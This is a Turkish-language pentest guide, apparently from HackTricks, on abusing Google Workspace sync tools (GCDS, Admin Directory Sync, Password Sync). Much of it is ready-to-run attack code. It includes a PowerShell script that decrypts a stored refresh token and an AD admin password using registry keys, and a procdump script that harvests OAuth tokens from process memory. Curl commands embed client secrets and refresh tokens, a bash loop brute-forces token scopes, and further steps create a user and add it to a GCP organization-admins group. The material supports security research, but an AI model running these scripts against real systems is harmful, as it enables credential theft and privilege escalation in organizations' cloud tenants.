https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Bu kapsamların bazılarını kullanarak bazı örnekler:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault**, Google Workspace için veri saklama, arama ve dışa aktarma araçları sağlayan bir eklentidir. Bu araçlar, Gmail, Drive, Chat ve daha fazlası gibi Google Workspace hizmetlerinde saklanan kuruluş verilerinizi yönetmenize yardımcı olur.

* Google Workspace Vault'taki bir **Matter**, belirli bir dava, soruşturma veya hukuki mesele ile ilgili tüm bilgileri organize eden ve gruplandıran bir **kapsayıcıdır**. Bu, o belirli konu ile ilgili **Holds**, **Searches** ve **Exports** yönetimi için merkezi bir merkez olarak hizmet eder.
* Google Workspace Vault'taki bir **Hold**, belirli kullanıcılar veya gruplar üzerinde **veri silinmesini veya değiştirilmesini önlemek** için uygulanan bir **koruma eylemidir**. Holds, ilgili bilgilerin bir hukuki dava veya soruşturma süresince sağlam ve değiştirilmemiş kalmasını sağlar.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
Daha fazla [API uç noktası belgelerde](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

Bu, **aktif dizin kullanıcılarınızı ve gruplarınızı Workspace ile senkronize etmek için kullanılabilecek bir araçtır** (ve bu yazının yazıldığı sırada tam tersi değildir).

İlginç çünkü bu, **bir Workspace süper kullanıcısının ve ayrıcalıklı AD kullanıcısının kimlik bilgilerini** gerektiren bir araçtır. Bu nedenle, zaman zaman kullanıcıları senkronize eden bir alan sunucusunda bulunması mümkün olabilir.

{% hint style="info" %}
**`config-manager.exe`** ikili dosyasına **MitM** gerçekleştirmek için `config.manager.vmoptions` dosyasına aşağıdaki satırı ekleyin: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GCDS**'yi tespit edebilir, yapılandırma hakkında bilgi alabilir ve **hatta şifreleri ve şifrelenmiş kimlik bilgilerini** elde edebilir.
{% endhint %}

Ayrıca, GCDS'nin AD'den Workspace'e şifreleri senkronize etmeyeceğini unutmayın. Eğer bir şey olursa, sadece Workspace'te yeni oluşturulan kullanıcılar için rastgele şifreler üretecektir, aşağıdaki resimde görebileceğiniz gibi:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Disk Token'ları ve AD Kimlik Bilgileri

`config-manager.exe` ikili dosyası (GUI ile ana GCDS ikilisi) yapılandırılmış Aktif Dizin kimlik bilgilerini, yenileme token'ını ve erişimi varsayılan olarak **C:\Program Files\Google Cloud Directory Sync** klasöründe **`Untitled-1.xml`** adlı bir **xml dosyasında** saklayacaktır. Ancak, bu aynı zamanda kullanıcının `Belgeler` klasöründe veya **herhangi bir başka klasörde** de kaydedilebilir.

Ayrıca, kayıt defteri **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** içindeki **`open.recent`** anahtarı, en son açılan tüm yapılandırma dosyalarının (xml'lerin) yollarını içerir. Bu nedenle, **bunları bulmak için kontrol etmek mümkündür**.

Dosya içindeki en ilginç bilgiler şunlardır:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Not edin ki **refresh** **token** ve kullanıcının **şifresi**, rastgele üretilen bir anahtar ve IV ile **AES CBC** kullanılarak **şifrelenmiştir** ve **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** içinde saklanmaktadır (nerede olursa olsun **`prefs`** Java kütüphanesi tercihleri saklar) string anahtarları **`/Encryption/Policy/V2.iv`** ve **`/Encryption/Policy/V2.key`** base64 formatında saklanmaktadır.

<details>

<summary>Refresh token ve şifreyi çözmek için Powershell scripti</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Bu bilgiyi **`C:\Program Files\Google Cloud Directory Sync`** içindeki **`DirSync.jar`** java kodunu kontrol ederek `exportkeys` dizesini arayarak kontrol etmenin mümkün olduğunu unutmayın (çünkü bu, ikili dosya `upgrade-config.exe`'nin anahtarları dökmesini beklediği cli parametresidir).
{% endhint %}

Powershell betiği yerine, **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** ikili dosyasını `-exportKeys` parametresi ile kullanmak ve anahtar ve IV'yi kayıt defterinden hex formatında almak mümkündür; ardından bu anahtar ve IV ile AES/CBC kullanarak bazı cyberchef araçları ile bilgiyi şifre çözmek mümkündür.

### GCDS - Bellekten token dökme

GCPW'de olduğu gibi, `config-manager.exe` sürecinin belleğini dökmek mümkündür (bu, GCDS ana ikili dosyasının GUI ile adıdır) ve yenileme ve erişim tokenlerini bulabileceksiniz (eğer zaten oluşturulmuşlarsa).\
Ayrıca AD yapılandırılmış kimlik bilgilerini de bulabileceğinizi düşünüyorum.

<details>

<summary>config-manager.exe süreçlerini dökün ve tokenleri arayın</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Yenileme jetonlarından erişim jetonları oluşturma

Yenileme jetonunu kullanarak, aşağıdaki komutta belirtilen istemci kimliği ve istemci sırrını kullanarak erişim jetonları oluşturmak mümkündür:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Kapsamlar

{% hint style="info" %}
Bir yenileme token'ına sahip olsanız bile, erişim token'ı için herhangi bir kapsam talep etmek mümkün değildir çünkü yalnızca **erişim token'ını oluşturduğunuz uygulama tarafından desteklenen kapsamları talep edebilirsiniz**.

Ayrıca, yenileme token'ı her uygulamada geçerli değildir.
{% endhint %}

Varsayılan olarak GCSD, kullanıcı olarak her olası OAuth kapsamına erişime sahip olmayacaktır, bu nedenle aşağıdaki betiği kullanarak `refresh_token` ile bir `access_token` oluşturmak için kullanılabilecek kapsamları bulabiliriz:

<details>

<summary>Kapsamları brute-force yapmak için Bash betiği</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anında aldığım çıktı şuydu:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Bir kullanıcı oluşturun ve bunu `gcp-organization-admins` grubuna ekleyin, GCP'de yükselmeyi deneyin
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
Yeni kullanıcıya Süper Admin rolü vermek mümkün değil çünkü **yenileme token'ı gerekli izinleri vermek için yeterli kapsamda değil**.
{% endhint %}

## Admin Dizin Senkronizasyonu

GCDS ile kullanıcıları senkronize etmenin bu yolunun ana farkı, GCDS'nin bazı ikili dosyaları indirip çalıştırarak manuel olarak yapılmasıdır, oysa **Admin Dizin Senkronizasyonu sunucusuz** olarak Google tarafından yönetilmektedir [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

Bu yazının yazıldığı anda bu hizmet beta aşamasındadır ve 2 tür senkronizasyonu desteklemektedir: **Active Directory** ve **Azure Entra ID** üzerinden:

* **Active Directory:** Bunu ayarlamak için **Google'a Active Directory ortamınıza erişim vermeniz** gerekir. Google yalnızca GCP ağlarına (**VPC bağlantıları** aracılığıyla) erişim sağladığı için bir bağlantı oluşturmanız ve ardından AD'nizi bu bağlantıdan, GCP ağındaki VM'lerde veya Cloud VPN veya Cloud Interconnect kullanarak erişilebilir hale getirmeniz gerekir. Ayrıca, dizin üzerinde okuma erişimi olan bir hesabın **kimlik bilgilerini** ve **LDAPS** üzerinden iletişim kurmak için bir **sertifika** sağlamanız gerekir.
* **Azure Entra ID:** Bunu yapılandırmak için sadece **Azure'da okuma erişimi olan bir kullanıcı ile giriş yapmanız** gerekir; bu, Google tarafından gösterilen bir açılır pencerede yapılır ve Google, Entra ID üzerinde okuma erişimi olan token'ı saklayacaktır.

Doğru bir şekilde yapılandırıldığında, her iki seçenek de **kullanıcıları ve grupları Workspace'e senkronize etmeye** olanak tanır, ancak Workspace'ten AD veya EntraID'ye kullanıcı ve grup yapılandırmasına izin vermez.

Bu senkronizasyon sırasında izin verilen diğer seçenekler şunlardır:

* Yeni kullanıcılara giriş yapmaları için bir e-posta gönderin
* E-posta adreslerini Workspace tarafından kullanılan adresle otomatik olarak değiştirin. Yani, Workspace `@hacktricks.xyz` kullanıyorsa ve EntraID kullanıcıları `@carloshacktricks.onmicrosoft.com` kullanıyorsa, `@hacktricks.xyz` hesapta oluşturulan kullanıcılar için kullanılacaktır.
* Senkronize edilecek **kullanıcıları içeren grupları** seçin.
* Senkronize edilecek ve Workspace'te oluşturulacak **grupları** seçin (veya tüm grupları senkronize etmek için belirtin).

### AD/EntraID'den -> Google Workspace (& GCP)

Bir AD veya EntraID'yi ele geçirmeyi başarırsanız, Google Workspace ile senkronize edilecek kullanıcılar ve gruplar üzerinde tam kontrol sahibi olursunuz.\
Ancak, kullanıcıların Workspace'te kullanıyor olabileceği **şifrelerin** **aynı olabileceğini veya olmayabileceğini** unutmayın.

#### Kullanıcılara Saldırı

Senkronizasyon gerçekleştiğinde, **AD'deki tüm kullanıcıları veya yalnızca belirli bir OU'daki kullanıcıları** veya yalnızca **EntraID'deki belirli grupların üyelerini** senkronize edebilir. Bu, senkronize edilmiş bir kullanıcıya saldırmak (veya senkronize edilen yeni bir kullanıcı oluşturmak) için önce hangi kullanıcıların senkronize edildiğini belirlemeniz gerektiği anlamına gelir.

* Kullanıcılar **AD veya EntraID'den şifrelerini yeniden kullanıyor olabilir**, ancak bu, **giriş yapmak için kullanıcıların şifrelerini ele geçirmeniz gerektiği** anlamına gelir.
* Kullanıcıların **maillerine** erişiminiz varsa, mevcut bir kullanıcının Workspace şifresini **değiştirebilir** veya **yeni bir kullanıcı oluşturabilir**, senkronize edilene kadar bekleyebilir ve hesabı ayarlayabilirsiniz.

Workspace içinde kullanıcıya eriştiğinizde, varsayılan olarak bazı **izinler verilebilir**.

#### Gruplara Saldırı

Öncelikle hangi grupların senkronize edildiğini belirlemeniz gerekir. **TÜM** grupların senkronize edilme olasılığı vardır (çünkü Workspace bunu sağlar).

{% hint style="info" %}
Gruplar ve üyelikler Workspace'e aktarılsa bile, **kullanıcı senkronizasyonunda senkronize edilmeyen kullanıcılar** grup senkronizasyonu sırasında oluşturulmayacaktır, bu grupların herhangi birinin üyesi olsalar bile.
{% endhint %}

Azure'dan hangi grupların **Workspace veya GCP'de izinler atandığını** biliyorsanız, o gruba ele geçirilmiş bir kullanıcıyı (veya yeni oluşturulmuş bir kullanıcıyı) ekleyebilir ve bu izinleri alabilirsiniz.

Workspace'teki mevcut ayrıcalıklı grupları kötüye kullanmanın başka bir yolu vardır. Örneğin, `gcp-organization-admins@<workspace.email>` grubu genellikle GCP üzerinde yüksek ayrıcalıklara sahiptir.

Örneğin, EntraID'den Workspace'e senkronizasyon **ithal edilen nesnenin alanını** Workspace'in e-posta adresi ile **değiştirecek şekilde yapılandırılmışsa**, bir saldırganın EntraID'de `gcp-organization-admins@<entraid.email>` grubunu oluşturması, bu gruba bir kullanıcı eklemesi ve tüm grupların senkronizasyonu gerçekleşene kadar beklemesi mümkün olacaktır.\
**Kullanıcı, GCP'de ayrıcalıkları artırarak `gcp-organization-admins@<workspace.email>` grubuna eklenecektir.**

### Google Workspace'ten -> AD/EntraID

Workspace'in kullanıcıları ve grupları senkronize etmek için AD veya EntraID üzerinde yalnızca okuma erişimi olan kimlik bilgilerine ihtiyaç duyduğunu unutmayın. Bu nedenle, Google Workspace'i AD veya EntraID'de herhangi bir değişiklik yapmak için kötüye kullanmak mümkün değildir. Yani **bu şu anda mümkün değildir**.

Google'ın AD kimlik bilgilerini veya EntraID token'ını nerede sakladığını da bilmiyorum ve **senkronizasyonu yeniden yapılandırarak bunları geri alamazsınız** (web formunda görünmezler, tekrar vermeniz gerekir). Ancak, web üzerinden mevcut işlevselliği **kullanıcıları ve grupları listelemek için** kötüye kullanmak mümkün olabilir.

## GPS - Google Şifre Senkronizasyonu

Bu, Google'ın **AD ile kullanıcıların şifrelerini senkronize tutmak için** sunduğu ikili dosya ve hizmettir. Bir kullanıcı AD'de şifresini her değiştirdiğinde, bu Google'a ayarlanır.

`C:\Program Files\Google\Password Sync` dizinine kurulur; burada yapılandırmak için `PasswordSync.exe` ikili dosyasını ve çalışmaya devam edecek olan `password_sync_service.exe` (hizmet) bulabilirsiniz.

### GPS - Yapılandırma

Bu ikili dosyayı (ve hizmeti) yapılandırmak için **Workspace'te bir Süper Admin ilkesine erişim vermeniz** gerekir:

* Google ile **OAuth** aracılığıyla giriş yapın ve ardından **kayıt defterinde (şifreli) bir token saklayacaktır**
* Sadece GUI'ye sahip Alan Denetleyicilerinde mevcut
* **Workspace kullanıcılarını yönetme** izinlerine sahip **GCP'den bazı Hizmet Hesabı kimlik bilgileri (json dosyası)** vermek
* Bu kimlik bilgileri asla süresi dolmadığı için kötüye kullanılabilir, çok kötü bir fikir
* Workspace üzerinde bir SA'ya erişim vermek çok kötü bir fikirdir çünkü SA GCP'de ele geçirilebilir ve Workspace'e geçiş yapmak mümkün olacaktır
* Google, GUI'siz alan denetimleri için bunu gerektirir
* Bu kimlik bilgileri de kayıt defterinde saklanır

AD ile ilgili olarak, mevcut **uygulama bağlamını, anonim veya bazı özel kimlik bilgilerini** kullanmasını belirtmek mümkündür. Kimlik bilgileri seçeneği seçilirse, **kullanıcı adı** bir dosyada **diskte** saklanır ve **şifre** **şifrelenir** ve **kayıt defterinde** saklanır.

### GPS - Diskten şifre ve token dökme

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GPS'yi** tespit edebilir, yapılandırma hakkında bilgi alabilir ve **şifreyi ve token'ı bile şifreleyebilir**.
{% endhint %}

**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** dosyasında, yapılandırmanın bir kısmını, yapılandırılan AD'nin **`baseDN`** ve kullanılan kimlik bilgileri olan **`username`** bulmak mümkündür.

Kayıt defterinde **`HKLM\Software\Google\Google Apps Password Sync`** altında, **şifrelenmiş yenileme token'ı** ve AD kullanıcısı için **şifrelenmiş şifre** (varsa) bulunabilir. Ayrıca, bir token yerine bazı **SA kimlik bilgileri** kullanılıyorsa, bunların da o kayıt defteri adresinde şifrelenmiş olarak bulunması mümkündür. Bu kayıt defterindeki **değerler** yalnızca **Yönetici** tarafından **erişilebilir**.

